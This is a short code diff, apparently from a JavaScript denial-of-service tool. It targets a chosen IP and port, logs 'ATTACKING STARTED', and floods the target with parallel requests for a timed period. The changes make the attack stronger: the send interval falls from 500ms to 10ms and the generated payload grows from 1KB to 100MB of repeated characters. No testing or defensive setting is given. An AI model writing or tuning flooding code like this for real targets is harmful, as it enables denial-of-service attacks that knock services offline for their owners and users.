@@ -259,7 +259,7 @@
 
             log('ATTACK', `[ATTACKING STARTED On ${targetIp}:${targetPort}]`);
             let timeLeft = 60; // Default attack time: 60 seconds
-            let attackSpeed = 500; // Adjust this value to control attack speed (lower = faster)
+            let attackSpeed = 10; // Send requests every 10ms (simulate 100MB/sec)
 
             attackTimer = setInterval(() => {
                 // Send multiple requests in parallel with large payload
@@ -296,10 +296,11 @@
             }
         }
 
-        // Function to generate a large payload (1KB for example)
+        // Function to generate a large payload (100MB)
         function generateLargePayload() {
             let largePayload = '';
-            for (let i = 0; i < 1024; i++) { // 1KB payload
+            const payloadSize = 100 * 1024 * 1024; // 100MB
+            for (let i = 0; i < payloadSize; i++) {
                 largePayload += 'A'; // Repeating 'A' to create a larger payload
             }
             return largePayload;
